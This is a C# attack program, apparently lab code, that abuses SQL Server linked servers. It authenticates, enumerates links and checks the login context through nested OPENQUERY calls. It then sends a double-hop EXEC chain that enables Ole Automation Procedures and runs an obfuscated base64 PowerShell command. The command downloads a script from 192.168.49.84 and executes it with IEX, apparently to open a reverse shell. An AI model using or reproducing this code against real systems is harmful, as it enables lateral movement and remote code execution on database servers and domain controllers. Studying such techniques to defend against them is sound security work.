using System;
using System.Collections.Generic;
using System.Data.SqlClient;

namespace SQLLinkedServers
{
    class Program
    {
        static void Main(string[] args)
        {
            String sqlServer = "appsrv01.corp1.com";
            String database = "master";
            String conString = "Server = " + sqlServer + "; Database = " + database + "; Integrated Security = True;" + "MultipleActiveResultSets = True;";
            SqlConnection con = new SqlConnection(conString);

            try
            {
                con.Open();
                Console.WriteLine("Auth success!");
            }
            catch
            {
                Console.WriteLine("Auth failed");
                Environment.Exit(0);
            }

            String get_links = "EXEC sp_linkedservers;";
            SqlCommand command = new SqlCommand(get_links, con);
            SqlDataReader reader = command.ExecuteReader();
            List<string> linked_servers = new List<string>();
            while (reader.Read())
            {
                linked_servers.Add((string)reader[0]);
            }
            reader.Close();

            for (int i = 1; i < linked_servers.Count; i++)
            {
                Console.WriteLine("Linked SQL server: " + linked_servers[i]);
                String querylogin = "SELECT mylogin FROM OPENQUERY(\"" + linked_servers[i] + "\", 'SELECT mylogin FROM OPENQUERY(\"appsrv01\", ''SELECT SYSTEM_USER AS mylogin'')');";
                command = new SqlCommand(querylogin, con);
                reader = command.ExecuteReader();
                reader.Read();
                Console.WriteLine("Executing in the context of: " + reader[0]);
                reader.Close();

                String exec_revshell = "EXEC ('EXEC (''sp_configure ''''show advanced options'''', 1; RECONFIGURE; EXEC sp_configure ''''Ole Automation Procedures'''', 1; RECONFIGURE; DECLARE @myshell INT; EXEC sp_oacreate ''''wscript.shell'''', @myshell OUTPUT; EXEC sp_oamethod @myshell, ''''run'''', null, ''''powershell -enc KABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADQAOQAuADgANAAvAHIAdQBuAC4AdAB4AHQAJwApACAAfAAgAEkARQBYAA=='''';'') AT appsrv01') AT DC01;";
                Console.WriteLine(exec_revshell);
                command = new SqlCommand(exec_revshell, con);
                reader = command.ExecuteReader();
                reader.Close();
            }
            con.Close();
        }
    }
}
